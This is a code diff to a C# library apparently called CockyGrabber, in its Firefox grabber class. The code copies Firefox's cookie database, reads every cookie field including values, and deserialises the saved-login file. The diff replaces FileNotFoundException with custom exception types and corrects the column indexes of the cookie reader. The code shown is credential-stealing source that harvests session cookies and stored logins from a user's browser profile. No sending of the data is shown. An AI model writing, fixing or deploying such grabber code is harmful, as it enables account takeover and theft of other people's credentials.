@@ -47,7 +47,7 @@ namespace CockyGrabber.Grabbers
         {
             List<Firefox.Cookie> cookies = new List<Firefox.Cookie>();
             if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
-            if (!CookiesExist()) throw new FileNotFoundException($"Program can't find \"{FirefoxCookiePath}\"", FirefoxCookiePath); // throw a FileNotFoundException if the Cookie DB was not found
+            if (!CookiesExist()) throw new CookieDatabaseNotFoundException(FirefoxCookiePath); // throw a CookieDatabaseNotFoundException if the Cookie DB was not found
 
             // Copy the database to a temporary location because it could be already in use
             string tempFile = GetTempFileName();
@@ -66,20 +66,20 @@ namespace CockyGrabber.Grabbers
                         cookies.Add(new Firefox.Cookie()
                         {
                             Id = reader.GetInt32(0),
-                            OriginAttributes = reader.GetString(0),
-                            Name = reader.GetString(0),
-                            Value = reader.GetString(1),
-                            Host = reader.GetString(2),
-                            Path = reader.GetString(3),
-                            Expiry = reader.GetInt64(4),
-                            LastAccessed = reader.GetInt64(5),
-                            CreationTime = reader.GetInt64(6),
-                            IsSecure = reader.GetBoolean(7),
-                            IsHttpOnly = reader.GetBoolean(8),
-                            InBrowserElement = reader.GetBoolean(9),
-                            SameSite = reader.GetInt16(10),
-                            RawSameSite = reader.GetInt16(11),
-                            SchemeMap = reader.GetInt16(12),
+                            OriginAttributes = reader.GetString(1),
+                            Name = reader.GetString(2),
+                            Value = reader.GetString(3),
+                            Host = reader.GetString(4),
+                            Path = reader.GetString(5),
+                            Expiry = reader.GetInt64(6),
+                            LastAccessed = reader.GetInt64(7),
+                            CreationTime = reader.GetInt64(8),
+                            IsSecure = reader.GetBoolean(9),
+                            IsHttpOnly = reader.GetBoolean(10),
+                            InBrowserElement = reader.GetBoolean(11),
+                            SameSite = reader.GetInt16(12),
+                            RawSameSite = reader.GetInt16(13),
+                            SchemeMap = reader.GetInt16(14),
                         });
                     }
                 }
@@ -93,7 +93,7 @@ namespace CockyGrabber.Grabbers
         public IEnumerable<Firefox.Cookie> GetCookies()
         {
             List<Firefox.Cookie> cookies = new List<Firefox.Cookie>();
-            if (!CookiesExist()) throw new FileNotFoundException($"Program can't find \"{FirefoxCookiePath}\"", FirefoxCookiePath); // throw a FileNotFoundException if the Cookie DB was not found
+            if (!CookiesExist()) throw new CookieDatabaseNotFoundException(FirefoxCookiePath); // throw a CookieDatabaseNotFoundException if the Cookie DB was not found
 
             // Copy the database to a temporary location because it could be already in use
             string tempFile = GetTempFileName();
@@ -140,7 +140,7 @@ namespace CockyGrabber.Grabbers
         #region GetLogins()
         public IEnumerable<Firefox.Login> GetLogins()
         {
-            if (!LoginsExist()) throw new FileNotFoundException($"Program can't find \"{FirefoxLoginPath}\"", FirefoxLoginPath); // throw a FileNotFoundException if the Login File was not found
+            if (!LoginsExist()) throw new LoginDatabaseNotFoundException(FirefoxLoginPath); // throw a LoginDatabaseNotFoundException if the Login File was not found
 
             return Deserialize<_LoginDB>(File.ReadAllText(FirefoxLoginPath)).Logins.ToList();
         }
@@ -149,7 +149,7 @@ namespace CockyGrabber.Grabbers
         {
             List<Firefox.Login> cookies = new List<Firefox.Login>();
             if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
-            if (!LoginsExist()) throw new FileNotFoundException($"Program can't find \"{FirefoxLoginPath}\"", FirefoxLoginPath); // throw a FileNotFoundException if the Login File was not found
+            if (!LoginsExist()) throw new LoginDatabaseNotFoundException(FirefoxLoginPath); // throw a LoginDatabaseNotFoundException if the Login File was not found
 
             foreach (Firefox.Login l in Deserialize<_LoginDB>(File.ReadAllText(FirefoxLoginPath)).Logins)
             {
